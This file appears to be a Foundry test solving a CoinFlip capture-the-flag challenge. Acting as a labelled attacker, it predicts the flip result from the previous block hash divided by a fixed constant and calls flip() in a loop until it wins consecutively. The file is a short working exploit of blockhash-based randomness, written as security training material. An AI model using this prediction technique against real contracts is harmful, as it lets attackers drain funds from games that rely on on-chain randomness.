// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {Utilities} from "./utilities/Utilities.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

contract CoinFlipTest is Test {
    Utilities internal utils;
    CoinFlip internal coinFlip;

    address internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);

        attacker = users[0];
        vm.label(attacker, "Attacker");

        coinFlip = new CoinFlip();
        vm.label(address(coinFlip), "CoinFlip");
    }

    function testExploit() public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        uint256 blockValue = uint256(blockhash(block.number - 1));

        blockValue = blockValue / FACTOR;

        uint8 consecutiveWinsToReach = 2;

        console.log("BlockValue", blockValue);

        // start transaction as attacker
        vm.startPrank(attacker);

        while (coinFlip.consecutiveWins() < consecutiveWinsToReach) {
            // create transaction
            coinFlip.flip(blockValue == 1 ? true : false);
            // each transaction create a new block using vm.roll()
            utils.mineBlocks(1);
        }
    }
}
